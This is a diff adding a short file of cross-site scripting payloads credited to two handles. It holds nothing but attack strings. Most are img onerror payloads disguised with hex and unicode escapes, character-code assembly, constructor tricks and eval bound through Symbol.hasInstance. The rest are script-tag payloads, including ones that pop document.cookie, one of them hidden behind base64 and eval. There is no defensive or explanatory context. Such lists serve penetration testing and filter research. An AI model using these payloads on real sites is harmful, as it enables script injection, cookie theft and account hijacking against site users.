@@ -1,0 +1,13 @@
+Obfuscated XSS by Xchopath
+<img src onerror=alert`1`>
+<img src onerror="Function`al\x65rt\x281\x29`()">
+<img src onerror="[].filter.constructor('('+('al'+'ert')+')(1)')()">
+<img src onerror="[].filter.constructor(''+String.fromCharCode(97,108,101,114,116)+'(1)')()">
+<img src onerror="[].filter.constructor('\u0061\u006c\u0065\u0072\u0074(1)')()">
+<img src onerror="[].filter.constructor('\x61\x6c\x65\x72\x74(1)')()">
+<img src onerror="([][Symbol.hasInstance]=eval,[]instanceof{[Symbol.hasInstance](){\u0061\u006c\u0065\u0072\u0074(0)}})">
+<img src onerror="let _=alert+0,x='alert'+_[14]+_[15];Array.prototype[Symbol.hasInstance]=eval;x instanceof []">
+Payload XSS by Raymond7
+<script>window.onload = function() {alert(1);}; </script>
+<script>window.onload = function() {alert(document.cookie);}; </script>
+<script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))</script>
